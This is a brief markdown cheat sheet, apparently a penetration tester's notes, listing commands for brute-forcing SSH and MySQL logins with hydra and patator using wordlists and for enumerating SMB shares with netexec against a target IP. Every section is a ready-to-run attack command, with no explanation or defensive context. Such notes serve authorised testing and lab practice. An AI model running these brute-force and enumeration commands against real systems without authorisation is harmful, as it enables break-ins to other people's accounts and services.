## SSH
```bash
# hydra
sudo hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 16 $ip ssh   

# Patator
sudo patator ssh_login host=$ip user=FILE0 password=FILE1 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Usernames/top-usernames-shortlist.txt -x ignore:code=1
```
## SMB
```bash
# netexec
sudo netexec smb $ip --shares -u 'user' -p 'password' 
sudo netexec smb $ip --shares -u 'user' -p 'password' --local-auth
```
## MYSQL
```bash
# Hydra
sudo hydra -L ./poss-usernames -P ./poss-usernames -t 16 $ip mysql
```
